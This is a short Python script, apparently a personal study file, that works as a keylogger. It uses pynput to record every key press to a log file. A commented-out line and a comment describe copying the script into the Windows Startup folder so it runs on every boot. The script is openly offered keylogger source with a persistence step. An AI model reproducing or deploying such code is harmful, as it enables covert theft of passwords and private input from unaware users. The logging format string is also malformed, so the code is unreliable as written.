from pynput.keyboard import Listener
import os,logging
from shutil import copyfile

username = os.getlogin()
logging_file = f"/Users/harigovind/Documents/python study files/KeyLogger"

# copyfile('keylog.py',f'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
#for windows users to run this program automactically on system startup

logging.basicConfig(filename = f"{logging_file}/mylog.txt",level = logging.DEBUG,format = "%(asctime)s: %(messages)s")

def keyhandler(key):

    logging.info(key)

with Listener(on_press = keyhandler) as listener:

    listener.join()

